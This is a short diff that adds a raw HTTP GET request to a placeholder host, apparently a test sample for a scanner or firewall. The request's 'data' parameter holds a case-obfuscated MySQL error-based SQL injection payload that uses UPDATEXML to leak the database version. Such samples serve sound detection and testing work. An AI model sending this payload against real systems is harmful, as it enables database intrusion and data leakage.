@@ -1,0 +1,4 @@
+GET /a?data=x'%20Or%20UpDaTeXmL(1,cOnCaT(0x7E,(sElEcT%20vErSiOn())),1)%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
